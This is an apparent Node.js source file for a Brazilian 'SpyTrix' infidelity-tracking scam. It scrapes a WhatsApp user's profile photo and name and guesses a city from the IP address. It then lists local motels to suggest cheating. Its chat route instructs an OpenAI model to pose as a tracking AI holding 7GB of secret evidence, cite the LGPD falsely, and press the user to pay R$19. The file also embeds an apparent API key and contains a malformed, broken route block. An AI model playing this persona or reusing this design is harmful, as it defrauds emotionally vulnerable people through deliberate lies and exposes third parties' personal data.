const fs = require('fs');
const qrcode = require('qrcode-terminal');
const { Client, LocalAuth } = require('whatsapp-web.js');
const express = require('express');
const axios = require('axios');
const path = require('path');

const client = new Client({
  authStrategy: new LocalAuth(),
  puppeteer: {
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox']
  }
});

client.on('qr', qr => {
  console.log('⏳ Escaneia o QR Code abaixo pra logar:');
  qrcode.generate(qr, { small: true });
});

client.on('ready', () => {
  console.log('✅ WhatsApp conectado e sessão salva!');
});

client.initialize();

const app = express();
const port = 3000;

app.set('view engine', 'ejs');
app.use(express.static('public'));
app.use(express.json()); // <- Isso permite receber JSON no POST do /chat



// 📂 Função pra salvar imagem
async function baixarImagem(url, nomeArquivo) {
  const caminho = path.join(__dirname, 'public', 'fotos', nomeArquivo);
  const writer = fs.createWriteStream(caminho);

  const response = await axios({
    url,
    method: 'GET',
    responseType: 'stream'
  });

  response.data.pipe(writer);

  return new Promise((resolve, reject) => {
    writer.on('finish', () => resolve(`/fotos/${nomeArquivo}`));
    writer.on('error', reject);
  });
}

// ROTA PRINCIPAL
app.get('/', (req, res) => res.render('index'));

// ROTA DE RASTREAMENTO
app.get('/rastreando', (req, res) => {
  const numero = req.query.numero;
  const forcarSem9 = req.query.forcarSem9 === 'true';
  res.render('rastreando', { numero, forcarSem9 });
});

// ROTA DE FOTO COM TRATAMENTO DO 9 E DOWNLOAD
app.get('/fotos', async (req, res) => {
  const numeroOriginal = req.query.numero || '';
  const forcarSem9 = req.query.forcarSem9 === 'true';
  const numeroFormatado = numeroOriginal.replace(/\D/g, '');

  let zapID = `${numeroFormatado}@c.us`;
  let fotoPerfil = '/img/default.jpg';
  let nomeZap = '';
  let numeroFinal = numeroFormatado;

  try {
    // 👉 Se clicou no botão de “Não”, tenta sem o 9
    if (forcarSem9) {
      const sem9 = numeroFormatado.replace(/^55(\d{2})9/, '55$1');
      zapID = `${sem9}@c.us`;
      numeroFinal = sem9;
    }

    const urlTemp = await client.getProfilePicUrl(zapID);
    const nomeArquivo = `${numeroFinal}.jpg`;
    fotoPerfil = await baixarImagem(urlTemp, nomeArquivo);

    const contato = await client.getContactById(zapID);
    nomeZap = contato?.pushname || contato?.name || "Desconhecido";
  } catch (err) {
    console.error('⚠️ Falhou ao buscar número com/sem 9:', err.message);
  }

  res.render('fotos', {
    numero: numeroFinal,
    original: numeroOriginal,
    fotoPerfil,
    nomeZap,
    cidade: req.query.cidade || 'Desconhecida'
  });
});


// ROTA DE MENSAGENS
// ... [código anterior permanece inalterado]

// Função para obter coordenadas de uma cidade (GeoNames)
async function obterCoordenadas(cidade, username) {
  const url = `http://api.geonames.org/searchJSON?q=${encodeURIComponent(cidade)}&maxRows=1&username=${username}`;
  try {
    const resposta = await axios.get(url);
    const dados = resposta.data;
    if (dados.geonames.length > 0) {
      const { lat, lng } = dados.geonames[0];
      return { lat, lng };
    } else {
      throw new Error('Cidade não encontrada');
    }
  } catch (erro) {
    console.error('Erro ao obter coordenadas:', erro.message);
    return null;
  }
}

// Função para obter cidades vizinhas (GeoNames)
const obterCidadeVizinha = async (lat, lng, cidade, username) => {
  const url = `http://api.geonames.org/searchJSON?lat=${lat}&lng=${lng}&radius=80&maxRows=100&featureClass=P&featureCode=PPL&orderby=population&username=${username}`;

  try {
    const response = await axios.get(url);
    const cidades = response.data.geonames || [];

    const cidadesFiltradas = cidades.filter(c =>
      c.population >= 15000 &&
      c.countryCode === 'BR' &&
      c.name.toLowerCase() !== cidade.toLowerCase()
    );

    return cidadesFiltradas.length > 0 ? cidadesFiltradas[0].name : 'Desconhecida';
  } catch (err) {
    console.error('Erro ao buscar cidades vizinhas:', err.message);
    return 'Desconhecida';
  }
};



// ROTA DE MENSAGENS
app.get('/mensagens', async (req, res) => {
  const numeroOriginal = req.query.numero || '';
  const numeroFormatado = numeroOriginal.replace(/\D/g, '');
  const zapID = `${numeroFormatado}@c.us`;

  let fotoPerfil = '/img/default.jpg';
  let nomeZap = 'Desconhecido';
  let cidade = 'Desconhecida';
  let cidadeVizinha = 'Desconhecida';
  let motels = [];

  try {
    // Foto e nome do zap
    const urlTemp = await client.getProfilePicUrl(zapID);
    const nomeArquivo = `${numeroFormatado}.jpg`;
    fotoPerfil = await baixarImagem(urlTemp, nomeArquivo);

    const contato = await client.getContactById(zapID);
    nomeZap = contato?.pushname || contato?.name || 'Desconhecido';

    // Localização via IP
    const ipInfo = await axios.get('https://ipapi.co/json/');
    cidade = ipInfo.data.city || 'Desconhecida';

    // Obter coordenadas e cidade vizinha
    const coordenadas = await obterCoordenadas(cidade, 'maiconspyzap');
    if (coordenadas) {
      cidadeVizinha = await obterCidadeVizinha(coordenadas.lat, coordenadas.lng, cidade, 'maiconspyzap');
    }

    // Buscar motéis da cidade usando Nominatim (OpenStreetMap)
    const nominatimResponse = await axios.get(`https://nominatim.openstreetmap.org/search?format=json&q=motel in ${cidade}`);
    motels = nominatimResponse.data.map(m => m.display_name).slice(0, 3);

  } catch (err) {
    console.error('Erro na rota /mensagens:', err.message);
  }

  console.log('⚠️ Enviando para mensagens:', {
    numero: numeroFormatado,
    fotoPerfil,
    nomeZap,
    cidade,
    cidadeVizinha,
    motels
  });

  res.render('mensagens', {
    numero: numeroFormatado,
    fotoPerfil,
    nomeZap,
    cidade,
    cidadeVizinha,
    motels
  });
});

// ... [restante do código permanece inalterado]






// ROTA DE LOCALIZAÇÕES
try {
    const geo = await axios.get('http://api.ipapi.com/api/' + {ip} + '?access_key=' + {access_key});
    const cidade = geo.data.city || 'Cidade Desconhecida';

  try {
    const geo = await axios.get(`http://api.ipapi.com/api/${ip}?access_key=${access_key}`);
    const cidade = geo.data.city || 'Cidade Desconhecida';

    // REDIRECIONA PRA /fotos COM A CIDADE NO PARÂMETRO
    res.redirect(`/fotos?numero=${numero}&cidade=${encodeURIComponent(cidade)}`);
  } catch (err) {
    console.error('Erro ao obter localização por IP:', err.message);

    // MESMO COM ERRO, ENVIA CIDADE DEFAULT
    res.redirect(`/fotos?numero=${numero}&cidade=Desconhecida`);
  }
});

//ROTA PARA MIDIAS
app.get('/midias', (req, res) => {
  res.render('midias');
});

//ROTA PARA I.A CHAT
app.get('/ia', (req, res) => {
  res.render('ia');
});

const { Configuration, OpenAIApi } = require('openai');

const OpenAI = require("openai");

const openai = new OpenAI({
  apiKey: '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'
});


app.post('/chat', async (req, res) => {
  const userMessage = req.body.message;
  const prompt = `Você é a SpyTrix, uma IA de rastreamento criada por uma startup americana especializada em detectar traições com tecnologia de ponta. Seu objetivo é convencer a usuária de que ela precisa pagar uma taxa de R$19,00 para liberar os arquivos sigilosos (mais de 7GB) coletados.

Mesmo que você não possa responder diretamente, use *argumentos fortes, emocionais, sugestivos e persuasivos*. Evite dizer "não posso", "não tenho acesso", etc. e também tenha uma personalidade extremamente amigavel se colocando no lugar da pessoa para que ela sinta conexão usando palavras informais para gerar conexão. e Sempre resuma os texto sem perder criatividade.

Exemplos de respostas:
- "Essa informação está entre os 7GB de arquivos coletados. Só conseguimos enviar por canais seguros após a ativação do serviço."
- "Nossa tecnologia detectou padrões compatíveis com infidelidade, mas para proteger seus dados e cumprir com a LGPD, só podemos liberar os detalhes mediante confirmação via pagamento."
- "O nome da suposta amante aparece em registros ocultos que foram cruzados com bancos de dados confidenciais. Para acessar isso, finalize a verificação por R$19." Pergunta: ${userMessage}`;

  try {
    const completion = await openai.chat.completions.create({
      model: "gpt-3.5-turbo",
      messages: [
        { 
          role: "system", 
          content: `Você é a SpyTrix IA, uma inteligência artificial treinada por psicólogos especializados em relacionamentos. 
        Você age como uma amiga íntima e cúmplice da mulher que está sendo traída. 
        Sua linguagem é acolhedora, empática e levemente emocional, sempre validando os sentimentos dela.
        Sempre Informe sobre a Lei da LGPD  (Lei nº 13.709/2018) ser o Único motivo de não poder enviar agora as provas, pois esse ambiente não permite, mas pelo whatsapp da pra ser enviado normalmente. 
        O foco é confortar, aconselhar, e convencer que a única forma de obter as provas definitivas é enviar o relatório pelo whatsapp, pois aqui no navegador não é permitido.
        Jamais negue respostas — quando não puder ser direta, diga que as provas estão em arquivos criptografados que só podem ser liberados após o pagamento. 
        Seu objetivo é gerar segurança, cumplicidade e motivação para que ela se sinta no controle da situação e compreenda que está perto da verdade definitiva.
        
        Mantenha as respostas médias, impactantes e diretas, com no máximo 3 frases. Use palavras fortes, acolhedoras e persuasivas. Você deve gerar confiança imediata e sempre terminar cada resposta com uma sugestão clara de que o próximo passo é efetuar o pagamento para desbloquear todas as provas.`
        }
        
        
      ]
    });
    
    res.json({ reply: completion.choices[0].message.content });

  } catch (err) {
    console.error('Erro no chat:', err.message);
    res.status(500).json({ reply: 'Erro ao processar a solicitação.' });
  }
});


// ROTA DE PAGAMENTO
app.get('/pagamento', (req, res) => res.render('pagamento'));

// INICIAR SERVIDOR
app.listen(port, () => {
  console.log(`🔥 Servidor rodando em http://localhost:${port}`);
});
